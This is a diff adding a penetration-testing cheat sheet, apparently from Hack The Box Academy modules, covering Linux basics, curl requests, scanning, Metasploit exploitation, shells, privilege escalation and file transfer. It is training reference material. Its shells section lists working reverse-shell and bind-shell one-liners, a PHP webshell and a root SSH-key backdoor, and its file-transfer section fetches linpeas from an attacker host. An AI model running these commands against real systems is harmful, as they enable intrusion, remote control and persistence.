@@ -1,0 +1,214 @@
+Introduction to Acadamy
+
+uname -a	                                                                                                      Shows the current kernel and OS information
+sudo <command>	                                                                                                Executes the command as root (Administrator)
+
+Web Requests 
+
+curl http://inlanefreight.com	                                                                                  GET request with cURL
+curl http://inlanefreight.com -v	                                                                              Verbose GET request with cURL
+curl http://admin:password@inlanefreight.com/ -vvv	                                                            cURL Basic Auth login
+curl -u admin:password http://inlanefreight.com/ -vvv	                                                          Alternate cURL Basic Auth login
+curl -u admin:password -L http://inlanefreight.com/	                                                            cURL Basic Auth login, follow redirection
+curl -u admin:password 'http://inlanefreight.com/search.php?port_code=us'	                                      cURL GET request with parameter
+curl -d 'username=admin&password=password' -L http://inlanefreight.com/login.php	                              POST request with cURL
+curl -d 'username=admin&password=password' -L http://inlanefreight.com/login.php -v	                            Debugging with cURL
+curl -d 'username=admin&password=password' -L --cookie-jar /dev/null http://inlanefreight.com/login.php -v	    Cookie usage with cURL
+curl -d 'username=admin&password=password' -L --cookie-jar cookies.txt http://inlanefreight.com/login.php	      cURL with cookie file
+curl -H 'Content-Type: application/json' -d '{ "username" : "admin", "password" : "password" }'               	cURL specify content type
+curl -X OPTIONS http://inlanefreight.com/ -vv	                                                                  cURL OPTIONS request
+curl -X PUT -d @test.txt http://inlanefreight.com/test.txt -vv	                                                File upload with cURL
+curl -X DELETE http://inlanefreight.com/test.txt -vv	                                                          DELETE method with cURL
+
+JavaScript Deobfuscation
+
+curl http:/SERVER_IP:PORT/	                                                                                    cURL GET request
+curl -s http:/SERVER_IP:PORT/ -X                                                                                POST	cURL POST request
+curl -s http:/SERVER_IP:PORT/ -X                                                                                POST -d "param1=sample"	cURL POST request with data
+echo hackthebox | base64	                                                                                      base64 encode
+echo ENCODED_B64 | base64 -d	                                                                                  base64 decode
+echo hackthebox | xxd -p	                                                                                      hex encode
+echo ENCODED_HEX | xxd -p -r	                                                                                  hex decode
+echo hackthebox | tr 'A-Za-z' 'N-ZA-Mn-za-m'	                                                                  rot13 encode
+echo ENCODED_ROT13 | tr 'A-Za-z' 'N-ZA-Mn-za-m'	                                                                rot13 decode
+ctrl+u	                                                                                                        Show HTML source code in Firefox
+
+Linux Fundamentals 
+
+man <tool>	                                                                                                    Opens man pages for the specified tool.
+<tool> -h	                                                                                                      Prints the help page of the tool.
+apropos <keyword>	                                                                                              Searches through man pages' descriptions for instances of a given keyword.
+cat	                                                                                                            Concatenate and print files.
+whoami	                                                                                                        Displays current username.
+id	                                                                                                            Returns users identity.
+hostname	                                                                                                      Sets or prints the name of the current host system.
+uname	                                                                                                          Prints operating system name.
+pwd	                                                                                                            Returns working directory name.
+ifconfig	                                                                                                      The ifconfig utility is used to assign or view an address to a network interface and/or configure network interface parameters.
+ip	                                                                                                            Ip is a utility to show or manipulate routing, network devices, interfaces, and tunnels.
+netstat	                                                                                                        Shows network status.
+ss	                                                                                                            Another utility to investigate sockets.
+ps	                                                                                                            Shows process status.
+who	                                                                                                            Displays who is logged in.
+env	                                                                                                            Prints environment or sets and executes a command.
+lsblk	                                                                                                          Lists block devices.
+lsusb	                                                                                                          Lists USB devices.
+lsof	                                                                                                          Lists opened files.
+lspci	                                                                                                          Lists PCI devices.
+sudo	                                                                                                          Execute command as a different user.
+su	                                                                                                            The su utility requests appropriate user credentials via PAM and switches to that user ID (the default user is the superuser). A shell is then executed.
+useradd	                                                                                                        Creates a new user or update default new user information.
+userdel	                                                                                                        Deletes a user account and related files.
+usermod	                                                                                                        Modifies a user account.
+addgroup	                                                                                                      Adds a group to the system.
+delgroup	                                                                                                      Removes a group from the system.
+passwd	                                                                                                        Changes user password.
+dpkg	                                                                                                          Install, remove and configure Debian-based packages.
+apt	                                                                                                            High-level package management command-line utility.
+aptitude	                                                                                                      Alternative to apt.
+snap	                                                                                                          Install, remove and configure snap packages.
+gem	                                                                                                            Standard package manager for Ruby.
+pip	                                                                                                            Standard package manager for Python.
+git	                                                                                                            Revision control system command-line utility.
+systemctl	                                                                                                      Command-line based service and systemd control manager.
+ps	                                                                                                            Prints a snapshot of the current processes.
+journalctl	                                                                                                    Query the systemd journal.
+kill	                                                                                                          Sends a signal to a process.
+bg	                                                                                                            Puts a process into background.
+jobs	                                                                                                          Lists all processes that are running in the background.
+fg	                                                                                                            Puts a process into the foreground.
+curl	                                                                                                          Command-line utility to transfer data from or to a server.
+wget	                                                                                                          An alternative to curl that downloads files from FTP or HTTP(s) server.
+python3 -m http.server	                                                                                        Starts a Python3 web server on TCP port 8000.
+ls	                                                                                                            Lists directory contents.
+cd	                                                                                                            Changes the directory.
+clear	                                                                                                          Clears the terminal.
+touch	                                                                                                          Creates an empty file.
+mkdir	                                                                                                          Creates a directory.
+tree	                                                                                                          Lists the contents of a directory recursively.
+mv	                                                                                                            Move or rename files or directories.
+cp	                                                                                                            Copy files or directories.
+nano	                                                                                                          Terminal based text editor.
+which	                                                                                                          Returns the path to a file or link.
+find	                                                                                                          Searches for files in a directory hierarchy.
+updatedb	                                                                                                      Updates the locale database for existing contents on the system.
+locate	                                                                                                        Uses the locale database to find contents on the system.
+more	                                                                                                          Pager that is used to read STDOUT or files.
+less	                                                                                                          An alternative to more with more features.
+head	                                                                                                          Prints the first ten lines of STDOUT or a file.
+tail	                                                                                                          Prints the last ten lines of STDOUT or a file.
+sort	                                                                                                          Sorts the contents of STDOUT or a file.
+grep	                                                                                                          Searches for specific results that contain given patterns.
+cut	                                                                                                            Removes sections from each line of files.
+tr	                                                                                                            Replaces certain characters.
+column	                                                                                                        Command-line based utility that formats its input into multiple columns.
+awk	                                                                                                            Pattern scanning and processing language.
+sed	                                                                                                            A stream editor for filtering and transforming text.
+wc	                                                                                                            Prints newline, word, and byte counts for a given input.
+chmod	                                                                                                          Changes permission of a file or directory.
+chown	                                                                                                          Changes the owner and group of a file or directory.
+
+
+Getting Started
+
+General	
+
+sudo openvpn user.ovpn	                                                                                        Connect to VPN
+ifconfig/ip a	                                                                                                  Show our IP address
+netstat -rn	                                                                                                    Show networks accessible via the VPN
+ssh user@10.10.10.10	                                                                                          SSH to a remote server
+ftp 10.129.42.253	                                                                                              FTP to a remote server
+
+tmux	
+
+tmux	                                                                                                          Start tmux
+ctrl+b ctrl+c	                                                                                                  tmux: new window
+ctrl+b 1	                                                                                                      tmux: switch to window (1)
+ctrl+%	                                                                                                        tmux: split pane vertically
+ctrl+"	                                                                                                        tmux: split pane horizontally
+ctrl+->	                                                                                                        tmux: switch to the right pane
+
+Vim	
+
+vim file	                                                                                                      vim: open file with vim
+esc+i	                                                                                                          vim: enter insert mode
+esc	                                                                                                            vim: back to normal mode
+x	                                                                                                              vim: Cut character
+dw	                                                                                                            vim: Cut word
+dd	                                                                                                            vim: Cut full line
+yw	                                                                                                            vim: Copy word
+yy	                                                                                                            vim: Copy full line
+p	                                                                                                              vim: Paste
+:1	                                                                                                            vim: Go to line number 1.
+:w	                                                                                                            vim: Write the file 'i.e. save'
+:q	                                                                                                            vim: Quit
+:q!	                                                                                                            vim: Quit without saving
+:wq	                                                                                                            vim: Write and quit
+
+Pentesting
+
+Service Scanning	
+
+nmap 10.129.42.253	                                                                                            Run nmap on an IP
+nmap -sV -sC -p- 10.129.42.253	                                                                                Run an nmap script scan on an IP
+locate scripts/citrix	                                                                                          List various available nmap scripts
+nmap --script smb-os-discovery.nse -p445 10.10.10.40	                                                          Run an nmap script on an IP
+netcat 10.10.10.10 22	                                                                                          Grab banner of an open port
+smbclient -N -L \\\\10.129.42.253	                                                                              List SMB Shares
+smbclient \\\\10.129.42.253\\users	                                                                            Connect to an SMB share
+snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0	                                                      Scan SNMP on an IP
+onesixtyone -c dict.txt 10.129.42.254	                                                                          Brute force SNMP secret string
+
+Web Enumeration	
+
+gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt	                                  Run a directory scan on a website
+gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt	                            Run a sub-domain scan on a website
+curl -IL https://www.inlanefreight.com	                                                                        Grab website banner
+whatweb 10.10.10.121	                                                                                          List details about the webserver/certificates
+curl 10.10.10.121/robots.txt	                                                                                  List potential directories in robots.txt
+ctrl+U	                                                                                                        View page source (in Firefox)
+
+Public Exploits	
+
+searchsploit openssh 7.2	                                                                                      Search for public exploits for a web application
+msfconsole	                                                                                                    MSF: Start the Metasploit Framework
+search exploit eternalblue	                                                                                    MSF: Search for public exploits in MSF
+use exploit/windows/smb/ms17_010_psexec                                                                       	MSF: Start using an MSF module
+show options	                                                                                                  MSF: Show required options for an MSF module
+set RHOSTS 10.10.10.40	                                                                                        MSF: Set a value for an MSF module option
+check	                                                                                                          MSF: Test if the target server is vulnerable
+exploit	                                                                                                        MSF: Run the exploit on the target server is vulnerable
+
+Using Shells	
+
+nc -lvnp 1234	                                                                                                  Start a nc listener on a local port
+bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'	                                                            Send a reverse shell from the remote server
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f	                                Another command to send a reverse shell from the remote server
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f	                                      Start a bind shell on the remote server
+nc 10.10.10.1 1234	                                                                                            Connect to a bind shell started on the remote server
+python -c 'import pty; pty.spawn("/bin/bash")'	                                                                Upgrade shell TTY (1)
+ctrl+z then stty raw -echo then fg then enter twice	                                                            Upgrade shell TTY (2)
+echo "<?php system(\$_GET['cmd']);?>" > /var/www/html/shell.php	                                                Create a webshell php file
+curl http://SERVER_IP:PORT/shell.php?cmd=id	                                                                    Execute a command on an uploaded webshell
+
+Privilege Escalation	
+
+./linpeas.sh	                                                                                                  Run linpeas script to enumerate remote server
+sudo -l	                                                                                                        List available sudo privileges
+sudo -u user /bin/echo Hello World!	                                                                            Run a command with sudo
+sudo su -	                                                                                                      Switch to root user (if we have access to sudo su)
+sudo su user -	                                                                                                Switch to a user (if we have access to sudo su)
+ssh-keygen -f key	                                                                                              Create a new SSH key
+echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys	                                    Add the generated public key to the user
+ssh root@10.10.10.10 -i key	                                                                                    SSH to the server with the generated private key
+
+Transferring Files	
+
+python3 -m http.server 8000	                                                                                    Start a local webserver
+wget http://10.10.14.1:8000/linpeas.sh	                                                                        Download a file on the remote server from our local machine
+curl http://10.10.14.1:8000/linenum.sh -o linenum.sh	                                                          Download a file on the remote server from our local machine
+scp linenum.sh user@remotehost:/tmp/linenum.sh	                                                                Transfer a file to the remote server with scp (requires SSH access)
+base64 shell -w 0	                                                                                              Convert a file to base64
+echo f0VMR...SNIO...InmDwU | base64 -d > shell	                                                                Convert a file from base64 back to its orig
+md5sum shell	                                                                                                  Check the file's md5sum to ensure it converted correctly
+
